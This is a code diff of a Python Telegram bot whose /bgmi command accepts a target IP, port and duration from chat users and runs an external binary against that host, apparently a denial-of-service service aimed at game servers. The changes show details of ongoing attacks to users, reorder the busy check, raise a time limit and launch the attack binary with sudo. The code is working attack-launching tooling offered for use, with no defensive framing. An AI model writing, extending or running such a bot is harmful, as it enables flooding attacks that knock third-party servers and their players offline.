@@ -58,28 +58,37 @@ async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Respond with the uptime
     await update.message.reply_text(f"⏳ Bot uptime: {minutes} minutes and {seconds} seconds.")
 
-# BGMI command handler
 async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     global active_attack
 
     # Check if bot uptime exceeds 15 minutes
     uptime = time.time() - bot_start_time
-    if uptime > 900:  # 15 minutes in seconds
+    if uptime > 1020:  # 15 minutes in seconds
         await update.message.reply_text("⏳ Wait for 5 minutes. The bot is going to restart.")
         return
 
     if not await ensure_correct_group(update, context):
         return
 
-    # Save user info to MongoDB
-    user = update.message.from_user
-    await save_user_info(user.id, user.username or "Unknown")
+    # Check if an attack is already in progress
+    if active_attack or user_processes:
+        # Retrieve details of the current attack
+        ongoing_attacks = [
+            f"Host: {data['target_ip']}, Port: {data['port']}, Time: {data['duration']} seconds"
+            for data in user_processes.values()
+        ]
+        attack_details = "\n".join(ongoing_attacks) if ongoing_attacks else "Attack in progress."
+        await update.message.reply_text(
+            f"🚫 An attack is already in progress. Please wait for it to finish.\n\nOngoing Attack:\n{attack_details}"
+        )
+        return
 
-    # Parse arguments
+    # Check if arguments are provided
     if len(context.args) != 3:
         await update.message.reply_text("🛡️ Use /bgmi <IP> <Port> <Time> to start an attack.")
         return
 
+    # Parse arguments
     target_ip = context.args[0]
     try:
         port = int(context.args[1])
@@ -93,14 +102,8 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         duration = MAX_DURATION
         await update.message.reply_text(f"⚠️ Max attack duration is {MAX_DURATION} seconds.")
 
-    # Check if an attack is already in progress
-    if active_attack or user_processes:
-        await update.message.reply_text("🚫 An attack is already in progress. Please wait for it to finish.")
-        return
-
-    active_attack = True
-
     # Notify user about the attack start
+    active_attack = True
     attack_message = await update.message.reply_text(
         f"🚀 Attack started on \nHost: {target_ip}\nPort: {port}\nTime: {duration} seconds."
     )
@@ -109,7 +112,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 async def start_attack(target_ip, port, duration, user_id, original_message, context):
     global active_attack
-    command = ['./xxxx', target_ip, str(port), str(duration)]
+    command = ['sudo', './xnx', target_ip, str(port), str(duration)]  # Add 'sudo' before the binary
 
     try:
         process = await asyncio.create_subprocess_exec(*command)
